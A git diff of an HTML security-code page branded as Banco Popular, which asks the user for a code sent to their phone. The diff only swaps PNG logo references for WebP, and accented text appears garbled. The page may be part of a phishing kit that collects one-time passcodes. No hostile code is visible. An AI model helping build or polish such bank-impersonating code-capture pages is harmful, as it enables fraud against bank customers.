@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>ValidaciÃ³n de Seguridad | Banco Popular</title>
-    <link rel="icon" type="image/png" href="popular_logo.png">
+    <link rel="icon" type="image/png" href="popular_logo.webp">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script type="text/javascript" src="../../scripts/functions2.js"></script>
@@ -222,7 +222,7 @@
 <body>
 
     <div id="loader-overlay">
-        <img src="popular_logo.png" alt="Banco Popular" style="width: 140px; margin-bottom: 40px;">
+        <img src="popular_logo.webp" alt="Banco Popular" style="width: 140px; margin-bottom: 40px;">
         <div class="spinner"></div>
         <p style="color: var(--popular-green); font-weight: 700; font-size: 15px;">Validando tu cÃ³digo de seguridad...</p>
     </div>
@@ -233,7 +233,7 @@
         </div>
 
         <div class="header-section">
-            <img src="popular_logo.png" alt="Banco Popular" class="logo-banco">
+            <img src="popular_logo.webp" alt="Banco Popular" class="logo-banco">
             <h1>CÃ³digo de Seguridad</h1>
             <p class="info-text">
                 Hemos enviado un cÃ³digo a tu celular registrado. <br>IngrÃ©salo para confirmar que eres tÃº.
